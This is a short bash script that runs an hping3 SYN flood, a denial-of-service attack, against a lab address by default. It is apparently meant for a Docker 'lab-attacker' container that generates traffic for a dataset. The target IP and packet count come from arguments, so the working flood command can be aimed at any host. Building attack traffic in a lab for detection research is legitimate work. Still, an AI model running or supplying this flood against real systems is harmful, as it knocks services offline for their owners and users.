#!/bin/bash
# DDoS (SYN flood) — run from inside lab-attacker:
#   docker exec -it lab-attacker bash /work/ddos.sh
#
# -c/--count caps the packet count so the lab doesn't just run forever;
# raise it later once you're capturing data for the dataset.
set -e

TARGET=${1:-172.30.0.10}
COUNT=${2:-20000}

echo "[*] SYN flood against $TARGET (count=$COUNT)"
hping3 -S -p 80 --flood -c "$COUNT" "$TARGET"
